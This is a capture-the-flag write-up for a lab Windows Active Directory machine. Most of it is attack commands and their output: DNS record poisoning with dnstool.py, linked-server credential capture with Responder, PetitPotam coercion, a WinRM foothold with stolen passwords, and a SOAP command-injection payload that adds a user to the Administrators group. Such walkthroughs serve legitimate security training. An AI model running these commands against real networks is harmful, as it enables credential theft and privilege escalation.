Overwatch Writeup

Author: atrox | Tags: Active Directory, WCF, MSSQL, PetitPotam, Unconstrained Delegation, SOAP Injection

Overview

Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service running as SYSTEM.

Lateral Movement — Linked Server Credential Capture

BloodHound reveals S200401 (DC) has Unconstrained Delegation enabled. We use dnstool.py to add a malicious DNS record pointing SQL07 to our Kali IP:

python3 dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -dns-ip 10.129.17.170 --zone overwatch.htb -r SQL07 -a add -t A -d <KALI_IP> 10.129.17.170

Now we connect to MSSQL as sqlsvc and trigger a query to the linked server:

impacket-mssqlclient -windows-auth -port 6520 \
  'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.17.170'
EXEC('SELECT * FROM OPENQUERY(SQL07, ''SELECT 1'')');
[MSSQL] Received connection from 10.129.17.170
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx

Bonus: PetitPotam (Machine Hash)

Coerce DC machine account authentication to our listener:

python3 PetitPotam.py -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb <KALI_IP> 10.129.17.170

Responder captures the NTLMv2 hash for OVERWATCH\S200401$.

Initial Foothold — WinRM

evil-winrm -i 10.129.17.170 -u sqlmgmt -p 'bIhBbzMMnB82yx'
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> cat user.txt
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> cat user.txt

Privilege Escalation — WCF SOAP Injection

The WCF service exposes a KillProcess method. We send a crafted SOAP request from our WinRM session to add sqlmgmt to the local Administrators group:

# SOAP Injection Payload
iwr http://overwatch.htb:8000/MonitorService `
  -UseBasicParsing -Method POST `
  -Headers @{
    "Content-Type"  = "text/xml; charset=utf-8"
    "SOAPAction"    = '"http://tempuri.org/IMonitoringService/KillProcess"'
  } `
  -Body "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'>
  <s:Body>
    <KillProcess xmlns='http://tempuri.org/'>
      <processName>notepad; net localgroup Administrators sqlmgmt /add</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>"

Verifying the result:

net localgroup Administrators
Members
-------
Administrator
Domain Admins
Enterprise Admins
sqlmgmt          ✅

sqlmgmt is now a local Administrator. From here, a new Evil-WinRM session gives full access to the Administrator's desktop and the root flag.

Attack Chain Summary

SMB anonymous access → WCF config → SQL connection string → sqlsvc creds → MSSQL linked server (SQL07) + DNS spoof + Responder → Cleartext creds: sqlmgmt → WinRM foothold → user.txt → WCF SOAP injection (KillProcess) → Local Admin → root.txt
